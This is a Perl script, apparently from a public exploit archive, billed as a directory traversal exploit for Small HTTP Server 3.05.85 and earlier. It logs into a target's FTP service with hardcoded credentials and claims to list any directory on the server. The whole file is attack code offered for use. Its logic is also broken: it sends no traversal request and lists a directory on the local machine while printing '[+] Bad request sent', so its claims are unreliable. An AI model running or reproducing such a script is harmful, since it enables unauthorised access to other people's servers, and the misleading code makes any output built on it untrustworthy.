#!/usr/bin/perl
#
# Author : Houssamix

# Small HTTP Server <= 3.05.85 Directory Traversal Exploit

# Description : Any user FTP with low permission can have access to any directory in server

# Downlod : http://smallsrv.com/
# [01.01.09] Happy new year! Version 3.05.84

# Greetz to Legend-Spy , Stack , Snakespc , str0ke & .. 

use LWP;
use Net::FTP;
use IO::Dir;  
use Tk;

if(@ARGV!=2){
    print "Author : Houssamix \n";
    print "Small HTTP Server <= 3.05.85 Directory Traversal Exploit\n";
    print "Usage: Hsmx.pl IP [dir_path] \n";
    print "Exam: Hsmx.pl 127.0.0.1 c:\\ \n\n";
    exit;
}

$ip = $ARGV[0];
$path = $ARGV[1];

my $username = "houssamix"; 
my $pass = "123456"; 
system("color f");

print "\n\n"; 
print "[+] Author : Houssamix\n"; 
print "[+] Small HTTP Server <= 3.05.85 Directory Traversal Exploit\n"; 
print "[+] Connect to $ip ...\n"; 
sleep(1);
$ftp = Net::FTP->new($ip, Debug => 0, Port => 21) || die "could not 
connect: $!";

print "[+] Send user and pass..\n";

$ftp->login($username, $pass) || die "could not login: $!"; 
sleep(1);

print "[+] Logged in\n";
print "[+] Bad request sent \n\n";
sleep(1);

tie %dir, IO::Dir, $path;
foreach (keys %dir) {
print  $_, " => " , $dir{$_}->size, "\n";
}

$ftp->quit; 